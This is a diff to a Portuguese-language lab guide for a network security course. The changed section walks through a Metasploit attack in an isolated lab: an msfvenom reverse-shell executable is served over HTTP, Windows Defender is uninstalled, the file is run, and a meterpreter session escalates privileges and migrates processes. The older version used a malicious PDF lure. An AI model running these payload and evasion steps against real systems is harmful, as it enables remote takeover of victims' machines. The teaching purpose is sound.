@@ -459,8 +459,9 @@ body.book #toc,body.book #preamble,body.book h1.sect0,body.book .sect1>h2{page-b
 <li><a href="#_3_ataque_syn_flood">3) Ataque SYN <strong><em>flood</em></strong></a></li>
 <li><a href="#_4_ataque_smurf">4) Ataque <strong><em>Smurf</em></strong></a></li>
 <li><a href="#_5_levantamento_de_serviços_usando_o_nmap">5) Levantamento de serviços usando o <strong><em>nmap</em></strong></a></li>
-<li><a href="#_6_realizando_um_ataque_com_o_metasploit">6) Realizando um ataque com o Metasploit</a></li>
-<li><a href="#_7_realizando_um_ataque_de_dicionário_com_o_medusa">7) Realizando um ataque de dicionário com o <strong><em>medusa</em></strong></a></li>
+<li><a href="#_6_realizando_um_ataque_com_o_metasploit_em_ambiente_windows">6) Realizando um ataque com o Metasploit em ambiente Windows</a></li>
+<li><a href="#_7_realizando_um_ataque_com_o_metasploit_em_ambiente_linux">7) Realizando um ataque com o Metasploit em ambiente Linux</a></li>
+<li><a href="#_8_realizando_um_ataque_de_dicionário_com_o_medusa">8) Realizando um ataque de dicionário com o <strong><em>medusa</em></strong></a></li>
 </ul>
 </li>
 <li><a href="#_sessão_3_firewall">Sessão 3: Firewall</a>
@@ -1341,6 +1342,44 @@ nameserver 8.8.4.4</pre>
 </div>
 <div class="title">Figure 8. Descoberta de rede da máquina WinServer-G</div>
 </div>
+<div class="paragraph">
+<p>Vamos agora desabilitar o download automático de atualizações, potencialmente muito grandes, para o sistema local. Em um ambiente de laboratório como o que estamos usando isso pode gerar um grande volume de tráfego inesperado na rede.</p>
+</div>
+<div class="paragraph">
+<p>A partir do menu Iniciar, invoque o Windows PowerShell. Em seguida, execute o comando <code>sconfig</code>:</p>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre>PS C:\Users\Administrator&gt; sconfig</pre>
+</div>
+</div>
+<div class="paragraph">
+<p>O <code>sconfig</code> é o <em>Server Configuration Tool</em>, uma ferramenta de linha de comando para configuração de instalações do Windows Server Core. Escolha a opção <code>5</code>, para editar as configurações do Windows Update:</p>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre>===============================================================================
+                         Server Configuration
+===============================================================================
+
+1) Domain/Workgroup:                    Workgroup:  GRUPO
+2) Computer Name:                       WINSERVER-A
+(...)
+
+Enter number to select an option: 5</pre>
+</div>
+</div>
+<div class="paragraph">
+<p>Agora, marque as atualizações do sistema como <code>(M)anual</code>&#8201;&#8212;&#8201;elas deverão ser expressamente baixadas e instaladas pelo administrador, quando desejado.</p>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre>Windows Update currently set to: DownloadOnly
+Select (A)utomatic, (D)ownloadOnly or (M)anual updates: m
+
+Setting updates to Manual...</pre>
+</div>
+</div>
 <div style="page-break-after: always;"></div>
 </li>
 <li>
@@ -1505,6 +1544,27 @@ nameserver 8.8.4.4</pre>
 </div>
 <div class="title">Figure 18. Descoberta de rede da máquina WinClient-G</div>
 </div>
+<div class="paragraph">
+<p>Finalmente, não se esqueça de desabilitar o serviço do Windows Update&#8201;&#8212;&#8201;esse serviço irá fazer o download e instalação automática de atualizações, potencialmente muito grandes, no sistema local. Em um ambiente de laboratório como o que estamos usando isso pode gerar um grande volume de tráfego inesperado na rede.</p>
+</div>
+<div class="paragraph">
+<p>Abra o <em>snap-in</em> de configuração de serviços do Windows executando o comando <code>services.msc</code>. Em seguida, navegue até o serviço <em>Windows Update</em> e clique com o botão direito em <em>Propriedades</em>.</p>
+</div>
+<div id="img-disableupdate1-winclient" class="imageblock" style="text-align: center">
+<div class="content">
+<img src="./img/winclient-15.png" alt="winclient 15">
+</div>
+<div class="title">Figure 19. Desabilitando o Windows Update na máquina WinClient-G, parte 1</div>
+</div>
+<div class="paragraph">
+<p>Em <em>Tipo de inicialização</em>, escolha <em>Desativado</em>. Clique em <em>Parar</em> para encerrar a execução do serviço, e depois clique em <em>Aplicar</em>.</p>
+</div>
+<div id="img-disableupdate2-winclient" class="imageblock" style="text-align: center">
+<div class="content">
+<img src="./img/winclient-16.png" alt="winclient 16">
+</div>
+<div class="title">Figure 20. Desabilitando o Windows Update na máquina WinClient-G, parte 2</div>
+</div>
 <div style="page-break-after: always;"></div>
 </li>
 </ol>
@@ -1646,7 +1706,7 @@ rtt min/avg/max/mdev = 36.474/37.168/37.931/0.636 ms</pre>
 <div class="content">
 <img src="./img/winserver-4.png" alt="winserver 4">
 </div>
-<div class="title">Figure 19. Janela de autorun do CD Virtualbox Guest Additions</div>
+<div class="title">Figure 21. Janela de autorun do CD Virtualbox Guest Additions</div>
 </div>
 <div style="page-break-after: always;"></div>
 </li>
@@ -1656,7 +1716,7 @@ rtt min/avg/max/mdev = 36.474/37.168/37.931/0.636 ms</pre>
 <div class="content">
 <img src="./img/winserver-8.png" alt="winserver 8">
 </div>
-<div class="title">Figure 20. Aviso de publisher não verificado do Virtualbox Guest Additions</div>
+<div class="title">Figure 22. Aviso de publisher não verificado do Virtualbox Guest Additions</div>
 </div>
 </li>
 <li>
@@ -1665,7 +1725,7 @@ rtt min/avg/max/mdev = 36.474/37.168/37.931/0.636 ms</pre>
 <div class="content">
 <img src="./img/winserver-9.png" alt="winserver 9">
 </div>
-<div class="title">Figure 21. Reiniciar sistema após instalação do Virtualbox Guest Additions</div>
+<div class="title">Figure 23. Reiniciar sistema após instalação do Virtualbox Guest Additions</div>
 </div>
 </li>
 <li>
@@ -1677,7 +1737,7 @@ rtt min/avg/max/mdev = 36.474/37.168/37.931/0.636 ms</pre>
 <div class="content">
 <img src="./img/winserver-10.png" alt="winserver 10">
 </div>
-<div class="title">Figure 22. Serviço do Virtualbox Guest Additions operacional</div>
+<div class="title">Figure 24. Serviço do Virtualbox Guest Additions operacional</div>
 </div>
 </li>
 <li>
@@ -1787,7 +1847,7 @@ vboxvideo              36864  0</pre>
 <div class="content">
 <img src="./img/winserver-11.png" alt="winserver 11">
 </div>
-<div class="title">Figure 23. Tela de configuração do sistema do WinServer</div>
+<div class="title">Figure 25. Tela de configuração do sistema do WinServer</div>
 </div>
 <div style="page-break-after: always;"></div>
 </li>
@@ -1797,7 +1857,7 @@ vboxvideo              36864  0</pre>
 <div class="content">
 <img src="./img/winserver-12.png" alt="winserver 12">
 </div>
-<div class="title">Figure 24. Alteração de nome de máquina do WinServer</div>
+<div class="title">Figure 26. Alteração de nome de máquina do WinServer</div>
 </div>
 <div style="page-break-after: always;"></div>
 </li>
@@ -1807,7 +1867,7 @@ vboxvideo              36864  0</pre>
 <div class="content">
 <img src="./img/winserver-13.png" alt="winserver 13">
 </div>
-<div class="title">Figure 25. Configurações de Remote Desktop do WinServer</div>
+<div class="title">Figure 27. Configurações de Remote Desktop do WinServer</div>
 </div>
 <div style="page-break-after: always;"></div>
 </li>
@@ -1817,7 +1877,7 @@ vboxvideo              36864  0</pre>
 <div class="content">
 <img src="./img/winserver-14.png" alt="winserver 14">
 </div>
-<div class="title">Figure 26. Desabilitar o firewall do WinServer</div>
+<div class="title">Figure 28. Desabilitar o firewall do WinServer</div>
 </div>
 </li>
 <li>
@@ -1836,7 +1896,7 @@ vboxvideo              36864  0</pre>
 <div class="content">
 <img src="./img/winserver-15.png" alt="winserver 15">
 </div>
-<div class="title">Figure 27. Instalação de roles e features no WinServer, parte 1</div>
+<div class="title">Figure 29. Instalação de roles e features no WinServer, parte 1</div>
 </div>
 <div class="paragraph">
 <p>Em <em>Select destination server</em>, mantenha <em>Select a server from the server pool</em> marcado e garanta que a máquina <em>WinServer-G</em> está selecionada na caixa <em>Server Pool</em>. Clique em <em>Next</em>.</p>
@@ -1848,7 +1908,7 @@ vboxvideo              36864  0</pre>
 <div class="content">
 <img src="./img/winserver-16.png" alt="winserver 16">
 </div>
-<div class="title">Figure 28. Instalação de roles e features no WinServer, parte 2</div>
+<div class="title">Figure 30. Instalação de roles e features no WinServer, parte 2</div>
 </div>
 <div class="paragraph">
 <p>Em <em>Select features</em>, clique em <em>Next</em>.</p>
@@ -1863,7 +1923,7 @@ vboxvideo              36864  0</pre>
 <div class="content">
 <img src="./img/winserver-17.png" alt="winserver 17">
 </div>
-<div class="title">Figure 29. Instalação de roles e features no WinServer, parte 3</div>
+<div class="title">Figure 31. Instalação de roles e features no WinServer, parte 3</div>
 </div>
 </li>
 <li>
@@ -1972,7 +2032,7 @@ vboxvideo              36864  0</pre>
 <div class="content">
 <img src="./img/virtualbox-1.png" alt="virtualbox 1">
 </div>
-<div class="title">Figure 30. Configuração de pasta compartilhada no Virtualbox</div>
+<div class="title">Figure 32. Configuração de pasta compartilhada no Virtualbox</div>
 </div>
 </li>
 <li>
@@ -1981,7 +2041,7 @@ vboxvideo              36864  0</pre>
 <div class="content">
 <img src="./img/virtualbox-2.png" alt="virtualbox 2">
 </div>
-<div class="title">Figure 31. Visualização de pasta compartilhada no Virtualbox</div>
+<div class="title">Figure 33. Visualização de pasta compartilhada no Virtualbox</div>
 </div>
 </li>
 <li>
@@ -2014,7 +2074,7 @@ vboxvideo              36864  0</pre>
 <div class="content">
 <img src="./img/wireshark-1.png" alt="wireshark 1">
 </div>
-<div class="title">Figure 32. Instalação do Wireshark, parte 1</div>
+<div class="title">Figure 34. Instalação do Wireshark, parte 1</div>
 </div>
 <div class="paragraph">
 <p>Aceite todas as opções padrão do instalador. Confirme também a instalação do Npcap, uma dependência do Wireshark, com suas opções padrão.</p>
@@ -2023,7 +2083,7 @@ vboxvideo              36864  0</pre>
 <div class="content">
 <img src="./img/wireshark-2.png" alt="wireshark 2">
 </div>
-<div class="title">Figure 33. Instalação do Wireshark, parte 2</div>
+<div class="title">Figure 35. Instalação do Wireshark, parte 2</div>
 </div>
 <div class="paragraph">
 <p>Ao final do processo, inicie o Wireshark&#8201;&#8212;&#8201;você deverá ver uma janela como a que se segue:</p>
@@ -2032,7 +2092,7 @@ vboxvideo              36864  0</pre>
 <div class="content">
 <img src="./img/wireshark-3.png" alt="wireshark 3">
 </div>
-<div class="title">Figure 34. Instalação do Wireshark, parte 3</div>
+<div class="title">Figure 36. Instalação do Wireshark, parte 3</div>
 </div>
 </li>
 <li>
@@ -2047,7 +2107,7 @@ vboxvideo              36864  0</pre>
 <div class="content">
 <img src="./img/wireshark-4.png" alt="wireshark 4">
 </div>
-<div class="title">Figure 35. Envio de usuário/senha por FTP</div>
+<div class="title">Figure 37. Envio de usuário/senha por FTP</div>
 </div>
 </li>
 <li>
@@ -2059,7 +2119,7 @@ vboxvideo              36864  0</pre>
 <div class="content">
 <img src="./img/wireshark-5.png" alt="wireshark 5">
 </div>
-<div class="title">Figure 36. Captura de sessão FTP no Wireshark</div>
+<div class="title">Figure 38. Captura de sessão FTP no Wireshark</div>
 </div>
 </li>
 </ol>
@@ -2519,7 +2579,7 @@ Nmap done: 1 IP address (1 host up) scanned in 3.18 seconds
 <div class="content">
 <img src="./img/nmap-1.png" alt="nmap 1">
 </div>
-<div class="title">Figure 37. Captura de scan nmap contra a máquina WinServer-G</div>
+<div class="title">Figure 39. Captura de scan nmap contra a máquina WinServer-G</div>
 </div>
 <div class="paragraph">
 <p>Note que uma série de pacotes SYN são enviados para diferentes portas do servidor Windows. Por sua vez, o Windows responde com um ACK se a porta estiver aberta, mas o <code>nmap</code> não envia um SYN/ACK em resposta a esse pacote&#8201;&#8212;&#8201;esse é o modo padrão de <em>scan</em> do <code>nmap</code>, TCP SYN, também conhecido como <em>half-open scan</em>.</p>
@@ -2647,7 +2707,7 @@ Nmap done: 1 IP address (1 host up) scanned in 13.31 seconds</pre>
 <div class="content">
 <img src="./img/nmap-2.png" alt="nmap 2">
 </div>
-<div class="title">Figure 38. Versão do SO na máquina WinServer-G</div>
+<div class="title">Figure 40. Versão do SO na máquina WinServer-G</div>
 </div>
 <div class="paragraph">
 <p>Como podemos observar, o <em>WinServer-G</em> é um Windows Server 2019 Datacenter&#8201;&#8212;&#8201;os resultados no <code>nmap</code> deixam um pouco a desejar, nesse caso.</p>
@@ -2657,7 +2717,7 @@ Nmap done: 1 IP address (1 host up) scanned in 13.31 seconds</pre>
 </div>
 </div>
 <div class="sect2">
-<h3 id="_6_realizando_um_ataque_com_o_metasploit">6) Realizando um ataque com o Metasploit</h3>
+<h3 id="_6_realizando_um_ataque_com_o_metasploit_em_ambiente_windows">6) Realizando um ataque com o Metasploit em ambiente Windows</h3>
 <div class="admonitionblock warning">
 <table>
 <tr>
@@ -2673,66 +2733,73 @@ Nmap done: 1 IP address (1 host up) scanned in 13.31 seconds</pre>
 </table>
 </div>
 <div class="paragraph">
-<p>Nessa atividade iremos executar uma série de comandos utilizando o <code>metasploit</code> disponível na máquina <em>KaliLinux-G</em>. O objetivo desta atividade é demonstrar duas coisas: primeiro, o poder da ferramenta Metasploit, e, segundo, que não devemos instalar em servidores programas desnecessários, como visualizadores de PDF.</p>
+<p>Nessa atividade iremos executar uma série de comandos utilizando o <code>metasploit</code> disponível na máquina <em>KaliLinux-G</em>. O objetivo desta atividade é demonstrar duas coisas: primeiro, o poder da ferramenta Metasploit, e, segundo, que não devemos executar binários de fontes desconhecidas ou outros artefatos potencialmente maliciosos.</p>
 </div>
 <div class="olist arabic">
 <ol class="arabic">
 <li>
-<p>Instale o <em>Adobe Reader</em> versão 9.3.4 na máquina <em>WinServer-G</em>. Esse programa pode ser encontrado no AVA, ou na pasta compartilhada via rede pelo instrutor.</p>
-</li>
-<li>
-<p>Agora, vamos gerar um arquivo PDF malicioso para explorar a vulnerabilidade do <em>Adobe Reader</em> instalado no passo (1). Acesse a máquina <em>KaliLinux-G</em> e execute:</p>
+<p>Primeiro, vamos gerar um executável malicioso usando a ferramenta <code>msfvenom</code>&#8201;&#8212;&#8201;um gerador de <em>payloads</em> e <em>encoder</em> integrante da suíte do Metasploit. Acesse a máquina <em>KaliLinux-G</em> como <code>root</code>, e execute-o:</p>
 <div class="literalblock">
 <div class="content">
 <pre># hostname
-KaliLinux-A
+KaliLinux-A</pre>
+</div>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre># whoami
+root</pre>
+</div>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre># msfvenom -a x64                                 \
+           --platform windows                     \
+           -p windows/x64/meterpreter/reverse_tcp \
+           LHOST=172.16.1.30                      \
+           LPORT=4444                             \
+           -f exe-only                            \
+           -b '\x00'                              \
+           -o /var/www/html/virus.exe
 
-# msfconsole
-
-msf &gt; use exploit/windows/fileformat/adobe_cooltype_sing
-
-msf exploit(adobe_cooltype_sing) &gt; set PAYLOAD windows/meterpreter/reverse_tcp
-PAYLOAD =&gt; windows/meterpreter/reverse_tcp
-
-msf exploit(adobe_cooltype_sing) &gt; set FILENAME boleto.pdf
-FILENAME =&gt; boleto.pdf
-
-msf exploit(adobe_cooltype_sing) &gt; set LHOST 172.16.1.30
-LHOST =&gt; 172.16.1.30
-
-msf exploit(adobe_cooltype_sing) &gt; set LPORT 4444
-LPORT =&gt; 4444
-
-msf exploit(adobe_cooltype_sing) &gt; exploit
-
-[*] Creating 'boleto.pdf' file...
-[+] boleto.pdf stored at /root/.msf4/local/boleto.pdf</pre>
+Found 3 compatible encoders
+Attempting to encode payload with 1 iterations of generic/none
+generic/none failed with Encoding failed due to a bad character (index=7, char=0x00)
+Attempting to encode payload with 1 iterations of x64/xor
+x64/xor succeeded with size 551 (iteration=0)
+x64/xor chosen with final size 551
+Payload size: 551 bytes
+Final size of exe-only file: 6144 bytes
+Saved as: /var/www/html/virus.exe</pre>
 </div>
 </div>
 <div class="paragraph">
-<p>O que foi feito?</p>
+<p>O que estamos fazendo?</p>
 </div>
 <div class="openblock">
 <div class="content">
 <div class="olist loweralpha">
 <ol class="loweralpha" type="a">
 <li>
-<p>Escolhemos o <em>exploit</em> a ser utilizado&#8201;&#8212;&#8201;no caso, o <code>adobe_cooltype_sing</code>.</p>
+<p>Selecionamos a arquitetura e plataforma-alvos do ataque: <code>Windows/x64</code>.</p>
 </li>
 <li>
-<p>Selecionamos o <em>payload</em> a ser enviado junto com o arquivo PDF que será gerado&#8201;&#8212;&#8201;<code>windows/meterpreter/reverse_tcp</code>. O <code>reverse_tcp</code> é um <em>payload</em> que inicia uma conexão TCP reversa, isto é, da vítima para o atacante, com o objetivo de burlar restrições de firewall para abertura de portas na rede local.</p>
-</li>
-<li>
-<p>Selecionamos o nome do arquivo&#8201;&#8212;&#8201;<code>boleto.pdf</code> . Um nome (e conteúdo) sugestivo são critérios fundamentais para que um ataque desse tipo tenha sucesso, pois o usuário deve acreditar que aquele arquivo é de fato útil e deve ser visualizado.</p>
+<p>Selecionamos o <em>payload</em> a ser enviado junto com o executável que será gerado&#8201;&#8212;&#8201;<code>windows/x64/meterpreter/reverse_tcp</code>. O <code>reverse_tcp</code> é um <em>payload</em> que inicia uma conexão TCP reversa, isto é, da vítima para o atacante, com o objetivo de burlar restrições de firewall para abertura de portas na rede local.</p>
 </li>
 <li>
 <p>Selecionamos o <em>host</em> local&#8201;&#8212;&#8201;esse é o IP da máquina que iniciará o <em>handler</em> da conexão reversa, que faremos no passo seguinte. No caso, é a própria máquina <em>KaliLinux-G</em>, 172.16.1.30.</p>
 </li>
 <li>
-<p>Selecionamos a porta na qual o cliente irá tentar buscar durante a conexão reversa. Aqui, foi escolhida a porta 4444, mas idealmente seria até melhor selecionar uma porta popular, como 80 ou 443, que provavelmente serão liberadas pelo firewall da rede.</p>
+<p>Selecionamos a porta na qual o cliente irá tentar buscar durante a conexão reversa. Aqui, foi escolhida a porta 4444, mas idealmente seria melhor selecionar uma porta popular, como 80 ou 443, que provavelmente estarão liberadas pelo firewall da rede.</p>
 </li>
 <li>
-<p>Finalmente, executamos <code>exploit</code>. No caso particular desse <em>exploit</em>, esse comando produziu o PDF malicioso objetivado, e o gravou no arquivo <code>/root/.msf4/local/boleto.pdf</code>.</p>
+<p>Selecionamos o formato de saída do <code>msfvenom</code>&#8201;&#8212;&#8201;<code>exe-only</code>. Isto irá produzir um executável padrão para ambiente Windows, colocando o <em>shellcode</em> do <em>payload</em> escolhido na seção <code>.text</code> do binário. É possível gerar um número bastante diverso de formatos de saída usando o <code>msfvenom</code>; pode-se consultá-los usando a opção <code>--list formats</code>.</p>
+</li>
+<li>
+<p>Determinamos quais caracteres não devem ser incluídos no binário de saída&#8201;&#8212;&#8201;apenas o caractere NUL (<code>\x00</code>), nesse caso.</p>
+</li>
+<li>
+<p>Selecionamos o nome do arquivo de saída&#8201;&#8212;&#8201;<code>/var/www/html/virus.exe</code>. Claro, esse é um nome (propositalmente) bastante óbvio&#8201;&#8212;&#8201;um nome (e conteúdo executável) sugestivo são critérios fundamentais para que um ataque desse tipo tenha sucesso, pois o usuário deve acreditar que aquele arquivo é de fato útil e deve ser executado.</p>
 </li>
 </ol>
 </div>
@@ -2740,79 +2807,137 @@ msf exploit(adobe_cooltype_sing) &gt; exploit
 </div>
 </li>
 <li>
-<p>O próximo passo é disponibilizar o PDF para a vítima. Felizmente, o Kali Linux já possui um servidor web instalado&#8201;&#8212;&#8201;basta copiar o arquivo gerado no passo anterior para a pasta <code>/var/www/html</code>, retirar o arquivo <code>index.html</code> dessa pasta para que a listagem de arquivos seja feita no navegador, e iniciar o serviço. Abra um novo terminal e faça isso:</p>
+<p>O próximo passo é disponibilizar o executável para a vítima. Felizmente, o Kali Linux já possui um servidor web instalado&#8201;&#8212;&#8201;como já colocamos o arquivo na pasta apropriada, basta iniciar o Apache:</p>
 <div class="literalblock">
 <div class="content">
-<pre># mv /root/.msf4/local/boleto.pdf /var/www/html/
-
-# mv /var/www/html/index.html /var/www/html/index.html.bak
-
-# systemctl start apache2</pre>
+<pre># systemctl start apache2</pre>
 </div>
 </div>
 </li>
 <li>
-<p>Agora, vamos fazer o download do arquivo PDF na máquina <em>WinServer-G</em>. Mas, antes disso, no entanto, precisamos iniciar o <em>handler</em> na máquina <em>KaliLinux-G</em>, que irá escutar a conexão TCP reversa:</p>
+<p>Antes de prosseguir, precisamos iniciar o <em>handler</em> na máquina <em>KaliLinux-G</em> que irá escutar a conexão TCP reversa:</p>
 <div class="literalblock">
 <div class="content">
-<pre># hostname
-KaliLinux-A
-
-# msfconsole
-
-msf &gt; use exploit/multi/handler
-
-msf exploit(handler) &gt; set PAYLOAD windows/meterpreter/reverse_tcp
-PAYLOAD =&gt; windows/meterpreter/reverse_tcp
-
-msf exploit(handler) &gt; set LHOST 172.16.1.30
-LHOST =&gt; 172.16.1.30
-
-msf exploit(handler) &gt; set LPORT 4444
-LPORT =&gt; 4444
-
-msf exploit(handler) &gt; exploit
-
-[*] Started reverse handler on 172.16.1.30:4444
-[*] Starting the payload handler...</pre>
+<pre># msfconsole</pre>
 </div>
 </div>
-<div style="page-break-after: always;"></div>
+<div class="literalblock">
+<div class="content">
+<pre>msf5 &gt; use exploit/multi/handler</pre>
+</div>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre>msf5 exploit(multi/handler) &gt; set PAYLOAD windows/x64/meterpreter/reverse_tcp
+PAYLOAD =&gt; windows/x64/meterpreter/reverse_tcp</pre>
+</div>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre>msf5 exploit(multi/handler) &gt; set LHOST 172.16.1.30
+LHOST =&gt; 172.16.1.30</pre>
+</div>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre>msf5 exploit(multi/handler) &gt; set LPORT 4444
+LPORT =&gt; 4444</pre>
+</div>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre>msf5 exploit(multi/handler) &gt; run
+
+[*] Started reverse TCP handler on 172.16.1.30:4444</pre>
+</div>
+</div>
 </li>
 <li>
-<p>Perfeito, agora sim. Na máquina <em>WinServer-G</em>, acesse a URL <a href="http://172.16.1.30" class="bare">http://172.16.1.30</a> (ajuste o endereço IP se você pertencer ao grupo <code>B</code>). Você deve ver o PDF disponível para download:</p>
-<div id="img-metasploit-browser" class="imageblock" style="text-align: center">
+<p>Vamos prosseguir! Acesse a máquina <em>WinServer-G</em> e abra o Windows PowerShell. Faça o download do executável gerado no passo (1) com o comando:</p>
+<div class="literalblock">
 <div class="content">
-<img src="./img/metasploit-browser.png" alt="metasploit browser">
+<pre>PS C:\Users\Administrator&gt; wget http://172.16.1.30/virus.exe -OutFile .\virus.exe</pre>
 </div>
-<div class="title">Figure 39. PDF malicioso disponível para download no browser</div>
 </div>
-<div style="page-break-after: always;"></div>
+<div class="paragraph">
+<p>Note que o executável é imediatamente detectado pelo antivírus nativo do sistema, o Windows Defender:</p>
+</div>
+<div id="img-metasploit-1" class="imageblock" style="text-align: center">
+<div class="content">
+<img src="./img/metasploit-1.png" alt="metasploit 1">
+</div>
+<div class="title">Figure 41. Executável malicioso detectado pelo Windows Defender</div>
+</div>
+<div class="paragraph">
+<p>Evidentemente, fica clara facilidade de detecção por estarmos usando o <em>template</em> padrão do Metasploit para entregar o <em>payload</em>, bem como o fato de não termos usado nenhuma técnica de evasão de antivírus. Neste momento, teríamos que empregar técnicas de ofuscação, criptografia ou codificação do executável para dificultar a detecção do antivírus, e assim conseguir efetivar o ataque&#8201;&#8212;&#8201;esses temas, contudo, extrapolam o escopo desta atividade.</p>
+</div>
 </li>
 <li>
-<p>Faça o download do PDF na máquina <em>WinServer-G</em>&#8201;&#8212;&#8201;será necessário adicionar a máquina <em>KaliLinux-G</em> à lista de <em>Trusted sites</em> do Internet Explorer antes de o download ser permitido. Depois, clique duas vezes no documento. O <em>Adobe Reader</em> irá iniciar, e uma tela vazia será apresentada, como a que se segue:</p>
-<div id="img-metasploit-pdf" class="imageblock" style="text-align: center">
+<p>Vamos desativar o antivírus Windows Defender na máquina <em>WinServer-G</em>, e testar. Ainda no Windows PowerShell, execute:</p>
+<div class="literalblock">
 <div class="content">
-<img src="./img/metasploit-pdf.png" alt="metasploit pdf">
+<pre>PS C:\Users\Administrator&gt; Uninstall-WindowsFeature -Name Windows-Defender
+
+Success Restart Needed Exit Code      Feature Result
+------- -------------- ---------      --------------
+True    Yes            SuccessRest... {Windows Defender Antivirus}
+WARNING: You must restart this server to finish the removal process.</pre>
 </div>
-<div class="title">Figure 40. Exploit do Adobe Reader com sucesso</div>
+</div>
+<div class="paragraph">
+<p>Após algum tempo, o Windows Defenser será desinstalado. Para concluir o procedimento, é necessário reiniciar o servidor&#8201;&#8212;&#8201;execute:</p>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre>PS C:\Users\Administrator&gt; Restart-Computer</pre>
+</div>
+</div>
+</li>
+<li>
+<p>Terá funcionado? Faça novamente o download do executável malicioso:</p>
+<div class="literalblock">
+<div class="content">
+<pre>PS C:\Users\Administrator&gt; wget http://172.16.1.30/virus.exe -OutFile .\virus.exe</pre>
+</div>
+</div>
+<div class="paragraph">
+<p>Aparentemente, não fomos detectados! Execute o programa:</p>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre>PS C:\Users\Administrator&gt; .\virus.exe</pre>
+</div>
 </div>
 </li>
 <li>
 <p>De volta à console do <em>KaliLinux-G</em>, observe que o <em>handler</em> recebeu a conexão reversa e iniciou o <em>meterpreter</em>, um <em>payload</em> avançado que irá permitir-nos controlar a máquina <em>WinServer-G</em> remotamente.</p>
 <div class="literalblock">
 <div class="content">
-<pre>[*] Started reverse handler on 172.16.1.30:4444
-[*] Starting the payload handler...
-[*] Sending stage (885806 bytes) to 172.16.1.20
-[*] Meterpreter session 1 opened (172.16.1.30:4444 -&gt; 172.16.1.20:49173) at 2018-08-18 02:27:47 -0400
+<pre>[*] Started reverse TCP handler on 172.16.1.30:4444
+[*] Sending stage (206403 bytes) to 172.16.1.20
+[*] Meterpreter session 1 opened (172.16.1.30:4444 -&gt; 172.16.1.20:49675) at 2019-04-10 02:33:22 -0300
 
 meterpreter &gt;</pre>
 </div>
 </div>
 </li>
 <li>
-<p>Primeiro, vamos escalar privilégios dentro da máquina-alvo. Se você executar o comando <code>getuid</code>, irá notar que o <code>meterpreter</code> está executando como o usuário que abriu o PDF originalmente (provavelmente, o usuário <code>Administrator</code>).</p>
+<p>Primeiro, vamos verificar que de fato acessamos a máquina <em>WinServer-G</em>. Execute:</p>
+<div class="literalblock">
+<div class="content">
+<pre>meterpreter &gt; sysinfo
+Computer        : WINSERVER-A
+OS              : Windows 2016 (Build 17763).
+Architecture    : x64
+System Language : pt_BR
+Domain          : GRUPO
+Logged On Users : 1
+Meterpreter     : x64/windows</pre>
+</div>
+</div>
+<div class="paragraph">
+<p>Vamos escalar privilégios dentro da máquina-alvo. Se você executar o comando <code>getuid</code>, irá notar que o <code>meterpreter</code> está executando como o usuário que invocou o executável originalmente (provavelmente, o usuário <code>Administrator</code>).</p>
+</div>
 <div class="literalblock">
 <div class="content">
 <pre>meterpreter &gt; getuid
@@ -2832,33 +2957,57 @@ Server username: NT AUTHORITY\SYSTEM</pre>
 </div>
 </li>
 <li>
-<p>Se o usuário fechar o Adobe Reader ou reiniciar a máquina, a conexão será perdida. Podemos usar o comando <code>migrate</code> para alterar o binário em que o <code>meterpreter</code> está alojado, de forma que se o usuário fechar o PDF aberto, não perderemos conexão com a máquina. Primeiro, vamos descobrir um processo adequado e então migrar para ele:</p>
+<p>Observe que nossa conexão atual está aberta apenas porque o processo <code>virus.exe</code> está operacional:</p>
 <div class="literalblock">
 <div class="content">
-<pre>meterpreter &gt; ps
+<pre>meterpreter &gt; ps virus
+Filtering on 'virus'
 
 Process List
 ============
 
- PID   PPID  Name              Arch  Session  User                          Path
- ---   ----  ----              ----  -------  ----                          ----
- 0     0     [System Process]
- 4     0     System            x86   0
- 420   4     smss.exe          x86   0        NT AUTHORITY\SYSTEM           \SystemRoot\System32\smss.exe  456   1040  taskeng.exe       x86   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\taskeng.exe
- 488   476   csrss.exe         x86   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.exe  532   524   csrss.exe         x86   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.exe  540   476   wininit.exe       x86   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\wininit.exe
- 568   524   winlogon.exe      x86   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\winlogon.exe
- 616   540   services.exe      x86   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\services.exe
- 628   540   lsass.exe         x86   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\lsass.exe  636   540   lsm.exe           x86   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\lsm.exe
- 796   616   svchost.exe       x86   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\svchost.exe
- 840   616   VBoxService.exe   x86   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\VBoxService.exe
- 892   616   svchost.exe       x86   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\system32\svchost.exe</pre>
+ PID   PPID  Name       Arch  Session  User                       Path
+ ---   ----  ----       ----  -------  ----                       ----
+ 3180  3224  virus.exe  x64   1        WINSERVER-A\Administrator  C:\Users\Administrator\virus.exe</pre>
+</div>
+</div>
+<div class="paragraph">
+<p>Se o usuário fechar o processo ou reiniciar a máquina, a conexão será perdida. Podemos usar o comando <code>migrate</code> para alterar o binário em que o <code>meterpreter</code> está alojado para manter conexão com a máquina mesmo que o programa <code>virus.exe</code> seja encerrado. Primeiro, vamos descobrir um processo adequado e então migrar para ele:</p>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre>meterpreter &gt; ps svchost
+Filtering on 'svchost'
+
+Process List
+============
+
+ PID   PPID  Name         Arch  Session  User                          Path
+ ---   ----  ----         ----  -------  ----                          ----
+ 8     564   svchost.exe  x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
+ 676   564   svchost.exe  x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
